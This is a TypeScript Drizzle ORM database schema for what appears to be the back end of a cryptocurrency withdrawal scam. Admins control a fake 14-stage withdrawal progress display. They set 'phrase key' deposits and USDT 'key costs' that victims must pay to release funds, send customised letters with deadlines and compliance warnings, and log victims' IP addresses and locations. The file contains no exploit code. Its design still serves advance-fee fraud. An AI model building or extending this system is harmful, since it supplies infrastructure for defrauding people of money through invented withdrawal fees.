import { sql } from "drizzle-orm";
import { pgTable, text, varchar, timestamp, serial, boolean } from "drizzle-orm/pg-core";
import { createInsertSchema } from "drizzle-zod";
import { z } from "zod";

export const cases = pgTable("cases", {
  id: varchar("id").primaryKey().default(sql`gen_random_uuid()`),
  accessCode: text("access_code").notNull().unique(),
  status: text("status").notNull().default('created'),
  
  // User registration data
  userName: text("user_name"),
  userEmail: text("user_email"),
  userMobile: text("user_mobile"),
  
  // Admin finalization data
  vipStatus: text("vip_status"),
  username: text("username"),
  withdrawalAmount: text("withdrawal_amount"),
  withdrawalBatches: text("withdrawal_batches"),
  physilocal0: text("physilocal0"),
  
  // Per-user deposit and profile settings
  depositAddress: text("deposit_address"),
  profileRedirectUrl: text("profile_redirect_url"),
  hasRequirements: boolean("has_requirements").default(false),
  
  // Letter control - admin manually sends letters
  letterSent: boolean("letter_sent").default(false),
  
  // Landing page preference after finalization
  landingPage: text("landing_page").default('dashboard'), // 'dashboard', 'letter', 'deposit', 'messages'
  
  // Priority level for case management
  priority: text("priority").default('medium'), // 'high', 'medium', 'low'
  
  // Case assignment and tags
  assignedTo: text("assigned_to"),
  tags: text("tags"), // JSON array of tags
  
  // Internal admin notes (not visible to user)
  internalNotes: text("internal_notes"),
  
  // IP/Location tracking
  lastLoginIp: text("last_login_ip"),
  lastLoginLocation: text("last_login_location"),
  lastLoginAt: timestamp("last_login_at"),
  
  // Progress tracking
  completionPercentage: text("completion_percentage").default('0'),
  
  // Withdrawal progress tracking (admin-controlled visibility)
  showWithdrawalProgress: boolean("show_withdrawal_progress").default(false),
  withdrawalStage: text("withdrawal_stage").default('1'), // 1-14 stages
  activityDepositAmount: text("activity_deposit_amount"), // Amount user needs to keep in wallet
  
  // Phrase Key tracking
  phraseKeyDepositAmount: text("phrase_key_deposit_amount"), // Admin-set deposit amount for phrase key
  phraseKeyMergeDeposit: text("phrase_key_merge_deposit"), // Calculated 30% of phraseKeyDepositAmount
  activityWalletRequirement: text("activity_wallet_requirement"), // USDT amount for activity verification
  phraseKeyCertificateSent: boolean("phrase_key_certificate_sent").default(false), // Flag for auto-message
  
  createdAt: timestamp("created_at").notNull().default(sql`now()`),
  updatedAt: timestamp("updated_at").notNull().default(sql`now()`),
});

export const insertCaseSchema = createInsertSchema(cases).omit({
  id: true,
  createdAt: true,
  updatedAt: true,
});

export const updateCaseSchema = insertCaseSchema.partial();

export type InsertCase = z.infer<typeof insertCaseSchema>;
export type UpdateCase = z.infer<typeof updateCaseSchema>;
export type Case = typeof cases.$inferSelect;

// Custom letter content per case
export const caseLetters = pgTable("case_letters", {
  id: serial("id").primaryKey(),
  caseId: varchar("case_id").notNull().references(() => cases.id),
  
  // Letter sections that admin can customize
  headline: text("headline").default("Withdrawal Protocol Selection"),
  introduction: text("introduction"),
  bodyContent: text("body_content"),
  footerNote: text("footer_note"),
  
  // Compliance reference text
  complianceReference: text("compliance_reference"),
  
  // Option A customization (matching screenshot exactly)
  optionATitle: text("option_a_title").default("Accelerated Release"),
  optionADescription: text("option_a_description"),
  optionAAmount: text("option_a_amount"),
  optionAFrequency: text("option_a_frequency"), // e.g., "every 12 hours"
  optionABatches: text("option_a_batches"), // e.g., "10 Transfers"
  optionAKeyCost: text("option_a_key_cost"), // e.g., "260.996 USDT"
  optionATotalRequirement: text("option_a_total_requirement"), // e.g., "2,609.96 USDT"
  optionATotalAmount: text("option_a_total_amount"),
  optionAFilelocoId: text("option_a_fileloco_id"),
  
  // Option B customization
  optionBTitle: text("option_b_title").default("Standard Release"),
  optionBDescription: text("option_b_description"),
  optionBAmount: text("option_b_amount"),
  optionBFrequency: text("option_b_frequency"), // e.g., "every 12 hours"
  optionBBatches: text("option_b_batches"), // e.g., "20 Transfers"
  optionBKeyCost: text("option_b_key_cost"), // e.g., "521.993 USDT"
  optionBTotalRequirement: text("option_b_total_requirement"), // e.g., "5,219.92 USDT"
  optionBTotalAmount: text("option_b_total_amount"),
  optionBFilelocoId: text("option_b_fileloco_id"),
  
  // Phrase Key Requirements section (JSON array of bullet points)
  phraseKeyRequirements: text("phrase_key_requirements"),
  
  // Compliance Notice warning text
  complianceNotice: text("compliance_notice"),
  
  // Scheduling - for scheduled letter delivery
  scheduledFor: timestamp("scheduled_for"),
  sentAt: timestamp("sent_at"),
  
  // Deadline/expiration for action
  expiresAt: timestamp("expires_at"),
  
  createdAt: timestamp("created_at").notNull().default(sql`now()`),
  updatedAt: timestamp("updated_at").notNull().default(sql`now()`),
});

export const insertCaseLetterSchema = createInsertSchema(caseLetters).omit({
  id: true,
  createdAt: true,
  updatedAt: true,
});

export const updateCaseLetterSchema = insertCaseLetterSchema.partial();

export type InsertCaseLetter = z.infer<typeof insertCaseLetterSchema>;
export type UpdateCaseLetter = z.infer<typeof updateCaseLetterSchema>;
export type CaseLetter = typeof caseLetters.$inferSelect;

// Submission history
export const caseSubmissions = pgTable("case_submissions", {
  id: serial("id").primaryKey(),
  caseId: varchar("case_id").notNull().references(() => cases.id),
  
  selectedOption: text("selected_option").notNull(),
  notes: text("notes"),
  
  // Snapshot of user info at submission time
  userName: text("user_name"),
  userEmail: text("user_email"),
  
  // Snapshot of withdrawal details at submission time
  withdrawalAmount: text("withdrawal_amount"),
  withdrawalBatches: text("withdrawal_batches"),
  
  submittedAt: timestamp("submitted_at").notNull().default(sql`now()`),
});

export const insertCaseSubmissionSchema = createInsertSchema(caseSubmissions).omit({
  id: true,
  submittedAt: true,
});

export type InsertCaseSubmission = z.infer<typeof insertCaseSubmissionSchema>;
export type CaseSubmission = typeof caseSubmissions.$inferSelect;

// Chat messages between admin and user
export const chatMessages = pgTable("chat_messages", {
  id: serial("id").primaryKey(),
  caseId: varchar("case_id").notNull().references(() => cases.id),
  sender: text("sender").notNull(), // 'admin' or 'user'
  message: text("message").notNull(),
  isRead: text("is_read").default('false'),
  createdAt: timestamp("created_at").notNull().default(sql`now()`),
});

export const insertChatMessageSchema = createInsertSchema(chatMessages).omit({
  id: true,
  createdAt: true,
});

export type InsertChatMessage = z.infer<typeof insertChatMessageSchema>;
export type ChatMessage = typeof chatMessages.$inferSelect;

// Admin messages with categories (Urgent/Processing/Resolved)
export const adminMessages = pgTable("admin_messages", {
  id: serial("id").primaryKey(),
  caseId: varchar("case_id").notNull().references(() => cases.id),
  category: text("category").notNull().default('processing'), // 'urgent', 'processing', 'resolved'
  title: text("title").notNull(),
  body: text("body").notNull(),
  isRead: boolean("is_read").default(false),
  createdAt: timestamp("created_at").notNull().default(sql`now()`),
});

export const insertAdminMessageSchema = createInsertSchema(adminMessages).omit({
  id: true,
  createdAt: true,
});

export type InsertAdminMessage = z.infer<typeof insertAdminMessageSchema>;
export type AdminMessage = typeof adminMessages.$inferSelect;

// Deposit receipts uploaded by users
export const depositReceipts = pgTable("deposit_receipts", {
  id: serial("id").primaryKey(),
  caseId: varchar("case_id").notNull().references(() => cases.id),
  submissionId: serial("submission_id"),
  imageData: text("image_data"), // Base64 encoded image
  fileName: text("file_name"),
  notes: text("notes"),
  status: text("status").default('pending'), // 'pending', 'reviewed', 'approved', 'rejected'
  adminNotes: text("admin_notes"), // Admin feedback/notes on the receipt
  uploadedAt: timestamp("uploaded_at").notNull().default(sql`now()`),
});

export const insertDepositReceiptSchema = createInsertSchema(depositReceipts).omit({
  id: true,
  uploadedAt: true,
});

export type InsertDepositReceipt = z.infer<typeof insertDepositReceiptSchema>;
export type DepositReceipt = typeof depositReceipts.$inferSelect;

// Activity timeline - tracks all user/admin actions
export const activityLogs = pgTable("activity_logs", {
  id: serial("id").primaryKey(),
  caseId: varchar("case_id").references(() => cases.id),
  actorType: text("actor_type").notNull(), // 'user', 'admin', 'system'
  actorId: text("actor_id"), // admin username or 'user'
  action: text("action").notNull(), // 'login', 'submission', 'message_sent', 'document_uploaded', etc.
  description: text("description").notNull(),
  metadata: text("metadata"), // JSON for additional data
  ipAddress: text("ip_address"),
  createdAt: timestamp("created_at").notNull().default(sql`now()`),
});

export const insertActivityLogSchema = createInsertSchema(activityLogs).omit({
  id: true,
  createdAt: true,
});

export type InsertActivityLog = z.infer<typeof insertActivityLogSchema>;
export type ActivityLog = typeof activityLogs.$inferSelect;

// Audit log - tracks all admin actions for compliance
export const auditLogs = pgTable("audit_logs", {
  id: serial("id").primaryKey(),
  adminUsername: text("admin_username").notNull(),
  action: text("action").notNull(), // 'create_case', 'finalize_case', 'send_message', etc.
  targetType: text("target_type"), // 'case', 'user', 'message', etc.
  targetId: text("target_id"),
  previousValue: text("previous_value"), // JSON of old state
  newValue: text("new_value"), // JSON of new state
  ipAddress: text("ip_address"),
  userAgent: text("user_agent"),
  createdAt: timestamp("created_at").notNull().default(sql`now()`),
});

export const insertAuditLogSchema = createInsertSchema(auditLogs).omit({
  id: true,
  createdAt: true,
});

export type InsertAuditLog = z.infer<typeof insertAuditLogSchema>;
export type AuditLog = typeof auditLogs.$inferSelect;

// Admin users with role-based access
export const adminUsers = pgTable("admin_users", {
  id: serial("id").primaryKey(),
  username: text("username").notNull().unique(),
  passwordHash: text("password_hash").notNull(),
  role: text("role").notNull().default('agent'), // 'super_admin', 'admin', 'agent', 'viewer'
  displayName: text("display_name"),
  email: text("email"),
  isActive: boolean("is_active").default(true),
  twoFactorEnabled: boolean("two_factor_enabled").default(false),
  twoFactorSecret: text("two_factor_secret"),
  lastLoginAt: timestamp("last_login_at"),
  createdAt: timestamp("created_at").notNull().default(sql`now()`),
  updatedAt: timestamp("updated_at").notNull().default(sql`now()`),
});

export const insertAdminUserSchema = createInsertSchema(adminUsers).omit({
  id: true,
  createdAt: true,
  updatedAt: true,
});

export type InsertAdminUser = z.infer<typeof insertAdminUserSchema>;
export type AdminUser = typeof adminUsers.$inferSelect;

// User feedback/ratings
export const userFeedback = pgTable("user_feedback", {
  id: serial("id").primaryKey(),
  caseId: varchar("case_id").notNull().references(() => cases.id),
  rating: text("rating").notNull(), // '1' to '5'
  comment: text("comment"),
  feedbackType: text("feedback_type").default('support'), // 'support', 'overall', 'feature'
  createdAt: timestamp("created_at").notNull().default(sql`now()`),
});

export const insertUserFeedbackSchema = createInsertSchema(userFeedback).omit({
  id: true,
  createdAt: true,
});

export type InsertUserFeedback = z.infer<typeof insertUserFeedbackSchema>;
export type UserFeedback = typeof userFeedback.$inferSelect;

// Message templates for quick replies
export const messageTemplates = pgTable("message_templates", {
  id: serial("id").primaryKey(),
  name: text("name").notNull(),
  category: text("category").default('general'), // 'greeting', 'follow_up', 'urgent', 'general'
  content: text("content").notNull(),
  isActive: boolean("is_active").default(true),
  usageCount: text("usage_count").default('0'),
  createdBy: text("created_by"),
  createdAt: timestamp("created_at").notNull().default(sql`now()`),
  updatedAt: timestamp("updated_at").notNull().default(sql`now()`),
});

export const insertMessageTemplateSchema = createInsertSchema(messageTemplates).omit({
  id: true,
  createdAt: true,
  updatedAt: true,
});

export type InsertMessageTemplate = z.infer<typeof insertMessageTemplateSchema>;
export type MessageTemplate = typeof messageTemplates.$inferSelect;

// Document requests from admin
export const documentRequests = pgTable("document_requests", {
  id: serial("id").primaryKey(),
  caseId: varchar("case_id").notNull().references(() => cases.id),
  documentType: text("document_type").notNull(), // 'id_proof', 'address_proof', 'bank_statement', etc.
  description: text("description"),
  status: text("status").default('pending'), // 'pending', 'submitted', 'approved', 'rejected'
  submittedFileData: text("submitted_file_data"), // Base64
  submittedFileName: text("submitted_file_name"),
  adminNotes: text("admin_notes"),
  deadline: timestamp("deadline"),
  submittedAt: timestamp("submitted_at"),
  createdAt: timestamp("created_at").notNull().default(sql`now()`),
});

export const insertDocumentRequestSchema = createInsertSchema(documentRequests).omit({
  id: true,
  createdAt: true,
});

export type InsertDocumentRequest = z.infer<typeof insertDocumentRequestSchema>;
export type DocumentRequest = typeof documentRequests.$inferSelect;

// User sessions for session management
export const userSessions = pgTable("user_sessions", {
  id: serial("id").primaryKey(),
  caseId: varchar("case_id").notNull().references(() => cases.id),
  sessionToken: text("session_token").notNull().unique(),
  ipAddress: text("ip_address"),
  userAgent: text("user_agent"),
  location: text("location"),
  isActive: boolean("is_active").default(true),
  lastActivityAt: timestamp("last_activity_at").notNull().default(sql`now()`),
  createdAt: timestamp("created_at").notNull().default(sql`now()`),
  expiresAt: timestamp("expires_at"),
});

export const insertUserSessionSchema = createInsertSchema(userSessions).omit({
  id: true,
  createdAt: true,
});

export type InsertUserSession = z.infer<typeof insertUserSessionSchema>;
export type UserSession = typeof userSessions.$inferSelect;

// Scheduled messages for future delivery
export const scheduledMessages = pgTable("scheduled_messages", {
  id: serial("id").primaryKey(),
  caseId: varchar("case_id").references(() => cases.id),
  messageType: text("message_type").notNull(), // 'chat', 'admin_message', 'letter'
  category: text("category"), // For admin messages: 'urgent', 'processing', 'resolved'
  title: text("title"),
  content: text("content").notNull(),
  scheduledFor: timestamp("scheduled_for").notNull(),
  status: text("status").default('pending'), // 'pending', 'sent', 'cancelled'
  sentAt: timestamp("sent_at"),
  createdBy: text("created_by"),
  createdAt: timestamp("created_at").notNull().default(sql`now()`),
});

export const insertScheduledMessageSchema = createInsertSchema(scheduledMessages).omit({
  id: true,
  createdAt: true,
});

export type InsertScheduledMessage = z.infer<typeof insertScheduledMessageSchema>;
export type ScheduledMessage = typeof scheduledMessages.$inferSelect;

// Help center articles
export const helpArticles = pgTable("help_articles", {
  id: serial("id").primaryKey(),
  title: text("title").notNull(),
  content: text("content").notNull(),
  category: text("category").default('general'), // 'general', 'deposits', 'withdrawals', 'account'
  order: text("display_order").default('0'),
  isPublished: boolean("is_published").default(true),
  viewCount: text("view_count").default('0'),
  createdAt: timestamp("created_at").notNull().default(sql`now()`),
  updatedAt: timestamp("updated_at").notNull().default(sql`now()`),
});

export const insertHelpArticleSchema = createInsertSchema(helpArticles).omit({
  id: true,
  createdAt: true,
  updatedAt: true,
});

export type InsertHelpArticle = z.infer<typeof insertHelpArticleSchema>;
export type HelpArticle = typeof helpArticles.$inferSelect;

// Notifications center
export const notifications = pgTable("notifications", {
  id: serial("id").primaryKey(),
  recipientType: text("recipient_type").notNull(), // 'admin', 'user'
  recipientId: text("recipient_id"), // admin username or caseId
  type: text("type").notNull(), // 'new_message', 'new_submission', 'document_uploaded', etc.
  title: text("title").notNull(),
  body: text("body"),
  link: text("link"), // URL to navigate to
  isRead: boolean("is_read").default(false),
  metadata: text("metadata"), // JSON
  createdAt: timestamp("created_at").notNull().default(sql`now()`),
});

export const insertNotificationSchema = createInsertSchema(notifications).omit({
  id: true,
  createdAt: true,
});

export type InsertNotification = z.infer<typeof insertNotificationSchema>;
export type Notification = typeof notifications.$inferSelect;

// Admin sessions for session management and 2FA
export const adminSessions = pgTable("admin_sessions", {
  id: varchar("id").primaryKey().default(sql`gen_random_uuid()`),
  adminUsername: text("admin_username").notNull(),
  token: text("token").notNull().unique(),
  ipAddress: text("ip_address"),
  userAgent: text("user_agent"),
  location: text("location"),
  isActive: boolean("is_active").default(true),
  lastActivityAt: timestamp("last_activity_at").notNull().default(sql`now()`),
  expiresAt: timestamp("expires_at").notNull(),
  revokedAt: timestamp("revoked_at"),
  revokedReason: text("revoked_reason"),
  createdAt: timestamp("created_at").notNull().default(sql`now()`),
});

export const insertAdminSessionSchema = createInsertSchema(adminSessions).omit({
  id: true,
  createdAt: true,
});

export type InsertAdminSession = z.infer<typeof insertAdminSessionSchema>;
export type AdminSession = typeof adminSessions.$inferSelect;

// Admin 2FA settings
export const adminTwoFactor = pgTable("admin_two_factor", {
  id: serial("id").primaryKey(),
  adminUsername: text("admin_username").notNull().unique(),
  secret: text("secret").notNull(),
  backupCodes: text("backup_codes"), // JSON array of hashed backup codes
  isEnabled: boolean("is_enabled").default(false),
  lastVerifiedAt: timestamp("last_verified_at"),
  enabledAt: timestamp("enabled_at"),
  createdAt: timestamp("created_at").notNull().default(sql`now()`),
  updatedAt: timestamp("updated_at").notNull().default(sql`now()`),
});

export const insertAdminTwoFactorSchema = createInsertSchema(adminTwoFactor).omit({
  id: true,
  createdAt: true,
  updatedAt: true,
});

export type InsertAdminTwoFactor = z.infer<typeof insertAdminTwoFactorSchema>;
export type AdminTwoFactor = typeof adminTwoFactor.$inferSelect;

// Chat templates for quick responses
export const chatTemplates = pgTable("chat_templates", {
  id: serial("id").primaryKey(),
  name: text("name").notNull(),
  content: text("content").notNull(),
  category: text("category").default('general'), // 'general', 'support', 'verification', 'deposits'
  shortcut: text("shortcut"), // Quick keyboard shortcut like /greeting
  isActive: boolean("is_active").default(true),
  usageCount: text("usage_count").default('0'),
  createdBy: text("created_by"),
  createdAt: timestamp("created_at").notNull().default(sql`now()`),
  updatedAt: timestamp("updated_at").notNull().default(sql`now()`),
});

export const insertChatTemplateSchema = createInsertSchema(chatTemplates).omit({
  id: true,
  createdAt: true,
  updatedAt: true,
});

export type InsertChatTemplate = z.infer<typeof insertChatTemplateSchema>;
export type ChatTemplate = typeof chatTemplates.$inferSelect;

// Case notes (admin-only comments)
export const caseNotes = pgTable("case_notes", {
  id: serial("id").primaryKey(),
  caseId: varchar("case_id").notNull().references(() => cases.id),
  adminUsername: text("admin_username").notNull(),
  content: text("content").notNull(),
  isPinned: boolean("is_pinned").default(false),
  createdAt: timestamp("created_at").notNull().default(sql`now()`),
  updatedAt: timestamp("updated_at").notNull().default(sql`now()`),
});

export const insertCaseNoteSchema = createInsertSchema(caseNotes).omit({
  id: true,
  createdAt: true,
  updatedAt: true,
});

export type InsertCaseNote = z.infer<typeof insertCaseNoteSchema>;
export type CaseNote = typeof caseNotes.$inferSelect;

// Localization/translations
export const translations = pgTable("translations", {
  id: serial("id").primaryKey(),
  key: text("key").notNull(),
  locale: text("locale").notNull(), // 'en', 'es', 'zh', etc.
  value: text("value").notNull(),
  context: text("context"), // Where this translation is used
  createdAt: timestamp("created_at").notNull().default(sql`now()`),
  updatedAt: timestamp("updated_at").notNull().default(sql`now()`),
});

export const insertTranslationSchema = createInsertSchema(translations).omit({
  id: true,
  createdAt: true,
  updatedAt: true,
});

export type InsertTranslation = z.infer<typeof insertTranslationSchema>;
export type Translation = typeof translations.$inferSelect;
